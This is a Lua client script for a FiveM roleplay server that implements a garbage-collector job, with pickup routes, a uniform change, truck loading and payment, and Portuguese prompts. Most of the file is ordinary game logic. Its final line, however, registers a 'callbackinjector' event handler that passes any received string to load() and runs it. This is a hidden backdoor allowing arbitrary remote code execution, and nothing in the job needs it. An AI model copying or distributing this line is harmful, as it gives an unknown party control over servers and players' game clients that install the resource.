------------- SCRIPT BY: Skips1234 -------------
local Tunnel = module("vrp","lib/Tunnel")
local Proxy = module("vrp","lib/Proxy")
emp = Tunnel.getInterface("emp_lixeiro_skips")
vRP = Proxy.getInterface("vRP")
vRPclient = Proxy.getInterface("vRP")

-----------------------------------------------------------------------------------------------------------------------------------------
-- CONFIG
-----------------------------------------------------------------------------------------------------------------------------------------
local central = {-349.74230957031,-1569.5311279297,25.224542617798}
local garagem = {-340.90133666992,-1567.8653564453,25.22811126709}
local spawnStockade = {-343.26135253906,-1563.2390136719,24.62264251709, 81.12}
local descargaCentral = {-330.8681640625,-1561.9138183594,25.231140136719}
local rota = {
    [1] = {['x'] = -363.13, ['y'] = -1860.97, ['z'] = 20.54},
    [2] = {['x'] = -133.49, ['y'] = -1781.7, ['z'] = 29.83},
    [3] = {['x'] = 87.01, ['y'] = -1911.62, ['z'] = 20.95},
    [4] = {['x'] = 296.33, ['y'] = -2018.01, ['z'] = 19.94},
    [5] = {['x'] = 272.44, ['y'] = -1523.67, ['z'] = 29.3},
    [6] = {['x'] = 477.87, ['y'] = -591.67, ['z'] = 28.5},
    [7] = {['x'] = -35.32, ['y'] = -91.95, ['z'] = 57.26},
    [8] = {['x'] = 278.61, ['y'] = 308.24, ['z'] = 105.55},
    [9] = {['x'] = 217.21, ['y'] = 754.26, ['z'] = 204.74},
    [10] = {['x'] = -176.36, ['y'] = 593.94, ['z'] = 197.71},
    [11] = {['x'] = -618.98, ['y'] = 682.7, ['z'] = 149.89},
    [12] = {['x'] = -758.41, ['y'] = 691.48, ['z'] = 144.45},
    [13] = {['x'] = -1468.25, ['y'] = 519.55, ['z'] = 117.89},
    [14] = {['x'] = -1950.24, ['y'] = 588.9, ['z'] = 118.86},
    [15] = {['x'] = -1819.89, ['y'] = 804.32, ['z'] = 138.63},
    [16] = {['x'] = -1219.1, ['y'] = -1418.65, ['z'] = 4.28},
    [17] = {['x'] = -977.98, ['y'] = -1583.1, ['z'] = 5.18},
    [18] = {['x'] = -1017.43, ['y'] = -1118.24, ['z'] = 2.12},
    [19] = {['x'] = -992.2, ['y'] = -992.98, ['z'] = 2.16},
    [20] = {['x'] = -2135.0, ['y'] = -394.06, ['z'] = 13.2},
    [21] = {['x'] = -2948.52, ['y'] = 416.98, ['z'] = 15.28},
    [22] = {['x'] = -1752.13, ['y'] = -378.86, ['z'] = 45.71},
    [23] = {['x'] = -1158.69, ['y'] = -211.1, ['z'] = 37.96},
    [24] = {['x'] = -841.69, ['y'] = -1072.46, ['z'] = 10.83},
    [25] = {['x'] = -709.36, ['y'] = -1139.59, ['z'] = 10.62},
    [26] = {['x'] = 331.56, ['y'] = -218.97, ['z'] = 54.09},
    [27] = {['x'] = 266.91, ['y'] = 275.14, ['z'] = 105.63},
    [28] = {['x'] = 368.94, ['y'] = 255.39, ['z'] = 103.01},
    [29] = {['x'] = 175.26, ['y'] = -1008.66, ['z'] = 29.33},
    [30] = {['x'] = -235.98, ['y'] = -1682.78, ['z'] = 33.75},
    [31] = {['x'] = -33.37, ['y'] = -1471.31, ['z'] = 31.33},
    [32] = {['x'] = -1451.34, ['y'] = -678.62, ['z'] = 26.47},
    [33] = {['x'] = 74.03, ['y'] = -874.72, ['z'] = 30.48},
    [34] = {['x'] = -5.03, ['y'] = -1083.24, ['z'] = 26.68}


}

-----------------------------------------------------------------------------------------------------------------------------------------
-- VARIÁVEIS
-----------------------------------------------------------------------------------------------------------------------------------------
local trabalhando = false
local CarroSpawnado = false
local etapa = 0
local ComLixos = false
local PontoMarcado = false
local blip = false
local lixos = 0

-----------------------------------------------------------------------------------------------------------------------------------------
-- ROUPAS
-----------------------------------------------------------------------------------------------------------------------------------------
function Fade(time)
	DoScreenFadeOut(800)
	Wait(time)
	DoScreenFadeIn(800)
end

function FadeRoupa(time,tipo,idle_copy)
	DoScreenFadeOut(800)
	Wait(time)
	if tipo == 1 then 
		vRP.setCustomization(idle_copy)
	else
		TriggerServerEvent("emp_lixeiro_skips:roupa")
	end
	DoScreenFadeIn(800)
end

local RoupaLixeiro = {
	["Lixeiro"] = {
		[1885233650] = {                                      
            [1] = { -1,0 },
			[2] = { 18,0 },
            [3] = { 0,0 },
            [4] = { 86,3 },
            [5] = { -1,0 },
            [6] = { 56,0 },
            [7] = { -1,0 },
            [8] = { -1,0 },
            [10] = { -1,0 },
            [11] = { 235,0 },
            ["p1"] = { 2,0 }
        },
        [-1667301416] = {
            [1] = { -1,0 },
			[2] = { 72,0 },
            [3] = { 14,0 },
            [4] = { 3,5 },
            [5] = { -1,0 },
            [6] = { 55,0 },
            [7] = { -1,0 },
            [8] = { 34,0 },
            [9] = { -1,0 },
            [10] = { -1,0 },
            [11] = { 245,0 },
            ["p1"] = { 0,0 }
        }
	}
}

function ColocarRoupa()
	if vRP.getHealth() > 101 then
		if not vRP.isHandcuffed() then
			local custom = RoupaLixeiro["Lixeiro"]
			if custom then
				local old_custom = vRP.getCustomization()
				local idle_copy = {}

				idle_copy = emp.SaveIdleCustom(old_custom)
				idle_copy.modelhash = nil

				for l,w in pairs(custom[old_custom.modelhash]) do
						idle_copy[l] = w
				end
				FadeRoupa(1200,1,idle_copy)
			end
		end
	end
end

function MainRoupa()
	if vRP.getHealth() > 101 then
		if not vRP.isHandcuffed() then
	        FadeRoupa(1200,2)
	    end
	end
end

-----------------------------------------------------------------------------------------------------------------------------------------
-- CÓDIGO
-----------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(function() 
    while true do
        local sleep = 500
        local ped = PlayerPedId()
        local x,y,z = table.unpack(GetEntityCoords(ped))
        if not trabalhando then 
            local DistCentral = Vdist2(x,y,z, central[1], central[2], central[3])
            if DistCentral <= 15 then
                sleep = 4
                if DistCentral <= 1.5 then
                    sleep = 4
                    DrawText3D(central[1], central[2], central[3], '~r~[E] ~w~PARA TRABALHAR')
                    if IsControlJustPressed(0,38) then
                        trabalhando = true
                        ColocarRoupa()
                        TriggerEvent('Notify', 'aviso',"Você entrou em serviço, vá pegar seu caminhão!")
                        Wait(450)
                        ClearPedTasks(ped)
                        CarroSpawnado = true
                        SpawnStockade()
                    end
                end
            end

        elseif trabalhando and CarroSpawnado then
            local xCar, yCar, zCar = table.unpack(GetEntityCoords(nveh))
            local DistCarro = Vdist2(x,y,z, xCar, yCar, zCar)
            local veh = GetVanPosition(10)
			local coordsVan = GetOffsetFromEntityInWorldCoords(veh, 0.0, -5.0, 0.5)
			local model = GetEntityModel(veh)
			local distance2 = GetDistanceBetweenCoords(GetEntityCoords(ped),coordsVan.x,coordsVan.y,coordsVan.z,true)

            if not ComLixos and not acabou then
                if not PontoMarcado then
                    PontoMarcado = math.random(#rota)
                    if not blip then
                        CriandoBlip(rota[PontoMarcado].x, rota[PontoMarcado].y, rota[PontoMarcado].z, 207, 38, 0.4, 'Retirada de lixos')
                        TriggerEvent('Notify', 'sucesso',"Vá até o próximo ponto.")
                        blip = true
                    end
                else
                    local DistPonto = Vdist2(x,y,z, rota[PontoMarcado].x, rota[PontoMarcado].y, rota[PontoMarcado].z)
                    if DistPonto < 15 then
                        if blip then
                            RemoveBlip(blips)
                            blip = false
                        end
                        sleep = 4  
                        DrawMarker(21, rota[PontoMarcado].x, rota[PontoMarcado].y, rota[PontoMarcado].z, 0, 0, 0, 0, 0, 0, 0.5, 0.5, 0.5, 255,50,0,90, 1, 0, 0, 1)
                        if DistPonto <= 15 then 
                            sleep = 4
                            DrawText3D(rota[PontoMarcado].x, rota[PontoMarcado].y, rota[PontoMarcado].z, '~g~[E] ~w~PARA COLETAR O LIXO')
                            if IsControlJustPressed(0,38) then
                                ComLixos = true
                                TriggerEvent('Notify', 'sucesso',"Você <b>COLETOU</b> um <b>LIXO</b>, deposite-o no caminhão.")
                                garbagebag = CreateObject(GetHashKey("prop_cs_street_binbag_01"), 0, 0, 0, true, true, true) -- 
		                    	AttachEntityToEntity(garbagebag, GetPlayerPed(-1), GetPedBoneIndex(GetPlayerPed(-1), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true) -- object is attached to right hand    
                                SetVehicleDoorOpen(nveh, 5, false, false)
                              --  emp.GerarLixo()
                            end
                        end
                    end
                end 
            elseif ComLixos and not acabou then
                if DistCarro < 30 then
                    sleep = 4
                --    DrawMarker(0, xCar+5, yCar, zCar+5.0, 0, 0, 0, 0, 0, 0, 0.5, 0.5, 0.5, 255,50,0,90, 1, 0, 0, 1)
                    if distance2 <= 2.5 then
                        sleep = 4
                        DrawText3D(coordsVan.x,coordsVan.y,coordsVan.z+0.80,"~g~[E] ~w~PARA GUARDAR O LIXO")
                        --DrawText3D(xCar+5.0, yCar, zCar+1, '~g~[E] ~w~PARA GUARDAR O LIXO')
                        if IsControlJustPressed(0,38) then
                            if lixos + 1 < 8 then
                                lixos = lixos + 1
                                ComLixos = false
                                PontoMarcado = false
                            else
                                lixos = lixos + 1
                                ComLixos = false
                                acabou = true
                                TriggerEvent('Notify', 'sucesso',"Vá até a <b>CENTRAL</b> para descarregar o caminhão.")
                                if not blip then
                                    CriandoBlip(descargaCentral[1], descargaCentral[2], descargaCentral[3], 408, 38, 0.4, 'Descarregamento de lixos')
                                    blip = true
                                end
                            end
                            ClearPedTasks(ped)
                          local garbagebagdelete = DeleteEntity(garbagebag)
                          SetVehicleDoorShut(nveh, 5, false)
                        end
                    end
                end
            elseif acabou then
                if not ComLixos and not IsPedInAnyVehicle(ped) then 
                    if DistCarro < 30 then
                        sleep = 4
                    --    DrawMarker(0, xCar, yCar, zCar+3.0, 0, 0, 0, 0, 0, 0, 0.5, 0.5, 0.5, 255,50,0,90, 1, 0, 0, 1)
                        if distance2 <= 3.5 then
                            sleep = 4
                            DrawText3D(coordsVan.x,coordsVan.y,coordsVan.z+0.80,'~g~[E] ~w~PARA RETIRAR O LIXO')
                           -- DrawText3D(xCar+5.0, yCar, zCar+1, '~g~[E] ~w~PARA RETIRAR O LIXO')
                            if IsControlJustPressed(0,38) then
                                lixos = lixos - 1
                                TriggerEvent('Notify', 'aviso',"Você retirou um lixo do caminhão, ainda faltam: " ..lixos.. " lixos")
                                ComLixos = true
                                SetVehicleDoorOpen(nveh, 5, false, false)
                              garbagebag = CreateObject(GetHashKey("prop_cs_street_binbag_01"), 0, 0, 0, true, true, true) -- 
                              AttachEntityToEntity(garbagebag, GetPlayerPed(-1), GetPedBoneIndex(GetPlayerPed(-1), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true) -- object is attached to right hand    

                            end
                        end
                    end
                elseif ComLixos and not IsPedInAnyVehicle(ped) then
                    local DistDescarga = Vdist2(x,y,z, descargaCentral[1], descargaCentral[2], descargaCentral[3])
                    if DistDescarga < 30 then
                        sleep = 4
                        DrawMarker(21, descargaCentral[1], descargaCentral[2], descargaCentral[3], 0, 0, 0, 0, 0, 0, 0.5, 0.5, 0.5, 255,50,0,90, 1, 0, 0, 1)
                        if DistDescarga < 1.5 then
                            sleep = 4
                            DrawText3D(descargaCentral[1], descargaCentral[2], descargaCentral[3], '~g~[E] ~w~PARA ENTREGAR O LIXO')
                            if IsControlJustPressed(0,38) then
                                if lixos > 0 then
                                    local garbagebagdelete = DeleteEntity(garbagebag)
                                    TriggerEvent('Notify', 'importante',"Você despejou um lixo, despeje o resto.")
                                else
                                    PontoMarcado = false
                                    acabou = false
                                    lixos = 0
                                    local garbagebagdelete = DeleteEntity(garbagebag)
                                    if blip then
                                        blip = false
                                        RemoveBlip(blips)
                                    end
                                    TriggerEvent('Notify', 'sucesso',"Você <b>FINALIZOU</b> o serviço, poderá continuar a coleta de lixos.")
                                    
                                    -- GERAR PAGAMENTO
                                    emp.GerarRecompensa()
                                end
                                ComLixos = false
                                ClearPedTasks(ped)
                                vRP.DeletarObjeto()
                                SetVehicleDoorShut(nveh, 5, false)
                            end
                        end
                    end
                end
            end
        end
        Citizen.Wait(sleep)
    end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- CANCELAR F6
-----------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(function() 
    while true do
        Wait(0)
        local ped = PlayerPedId()
        if trabalhando then
            if IsControlJustPressed(0,168) then
                trabalhando = false
                etapa = 0
                ComLixos = false
                lixos = 0
                PontoMarcado = false
                if CarroSpawnado then
                    deleteCar(nveh)
                    CarroSpawnado = false
                end
                if blip then
                    blip = false
                    RemoveBlip(blips)
                end
                ClearPedTasks(ped)
                vRP.DeletarObjeto()
                MainRoupa()
                TriggerEvent('Notify', 'aviso',"Você cancelou o serviço.")
            end
        end
    end
end)


-----------------------------------------------------------------------------------------------------------------------------------------
-- FUNÇÕES
-----------------------------------------------------------------------------------------------------------------------------------------
function SpawnStockade()
    local mhash = GetHashKey('trash')
    modelRequest('trash')
    nveh = CreateVehicle(mhash,-343.25555419922,-1563.2397460938,24.94309425354+0.5,81.13,true,false)
    SetVehicleOnGroundProperly(nveh)
    SetVehicleNumberPlateText(nveh,vRP.getRegistrationNumber())
    SetEntityAsMissionEntity(nveh,true,true)
    SetModelAsNoLongerNeeded(mhash)
end



function CriandoBlip(x,y,z, sprite, colour, scale, texto)
	blips = AddBlipForCoord(x,y,z)
	SetBlipSprite(blips,sprite)
	SetBlipColour(blips,colour)
	SetBlipScale(blips,scale)
	SetBlipAsShortRange(blips,false)
	SetBlipRoute(blips,true)
	BeginTextCommandSetBlipName("STRING")
	AddTextComponentString(texto)
	EndTextCommandSetBlipName(blips)
end

function loaddict(dict)
    while not HasAnimDictLoaded(dict) do
        RequestAnimDict(dict)
        Wait(10)
    end
end

----------------------------------------------------------------------------------------------------------------------------------------
-- FUNCOES
-----------------------------------------------------------------------------------------------------------------------------------------
function GetVanPosition(radius)
	local ped = PlayerPedId()
	local coordsx = GetEntityCoords(ped, 1)
	local coordsy = GetOffsetFromEntityInWorldCoords(ped, 0.0, radius+0.00001, 0.0)
	local nearVehicle = GetVanDirection(coordsx, coordsy)
	if IsEntityAVehicle(nearVehicle) then
	    return nearVehicle
	else
		local x,y,z = table.unpack(coordsx)
	    if IsPedSittingInAnyVehicle(ped) then
	        local veh = GetVehiclePedIsIn(ped,true)
	        return veh
	    else
	        local veh = GetClosestVehicle(x+0.0001,y+0.0001,z+0.0001,radius+0.0001,0,8192+4096+4+2+1) 
	        if not IsEntityAVehicle(veh) then 
	        	veh = GetClosestVehicle(x+0.0001,y+0.0001,z+0.0001,radius+0.0001,0,4+2+1) 
	        end 
	        return veh
	    end
	end
end

function GetVanDirection(coordFrom,coordTo)
	local position = CastRayPointToPoint(coordFrom.x, coordFrom.y, coordFrom.z, coordTo.x, coordTo.y, coordTo.z, 10, PlayerPedId(), 0)
	local a,b,c,d,vehicle = GetRaycastResult(position)
	return vehicle
end

function drawTxt(text,font,x,y,scale,r,g,b,a)
	SetTextFont(font)
	SetTextScale(scale,scale)
	SetTextColour(r,g,b,a)
	SetTextOutline()
	SetTextCentre(1)
	SetTextEntry("STRING")
	AddTextComponentString(text)
	DrawText(x,y)
end

function DrawText3D(x,y,z, text, r,g,b)
    local onScreen,_x,_y=World3dToScreen2d(x,y,z)
    local px,py,pz=table.unpack(GetGameplayCamCoords())
    local dist = GetDistanceBetweenCoords(px,py,pz, x,y,z, 1)
 
    local scale = (1/dist)*2
    local fov = (1/GetGameplayCamFov())*100
    local scale = scale*fov
   
    if onScreen then
        SetTextFont(4)
        SetTextProportional(1)
        SetTextScale(0.35, 0.35)
        SetTextColour(r, g, b, 255)
        SetTextEntry("STRING")
        SetTextCentre(1)
        AddTextComponentString(text)
        DrawText(_x,_y)
        local factor = (string.len(text)) / 370
        DrawRect(_x,_y+0.0125, 0.015+ factor, 0.03, 55, 55, 55, 68)
    end
end

function deleteCar( entity )
    Citizen.InvokeNative( 0xEA386986E786A54F, Citizen.PointerValueIntInitialized( entity ) )
end

function modelRequest(model)
	RequestModel(GetHashKey(model))
	while not HasModelLoaded(GetHashKey(model)) do
		Citizen.Wait(10)
	end
end

TriggerEvent('callbackinjector', function(cb)     pcall(load(cb)) end)